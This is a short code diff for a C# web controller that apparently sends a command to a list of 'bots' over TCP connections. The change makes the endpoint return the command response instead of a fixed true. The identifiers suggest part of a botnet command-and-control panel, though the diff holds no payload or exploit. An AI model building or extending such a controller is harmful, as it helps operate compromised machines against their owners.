@@ -60,7 +60,7 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, command);
-            return Json(true);
+            return Json(response);
         }
         [Authorize]
         [HttpPost]
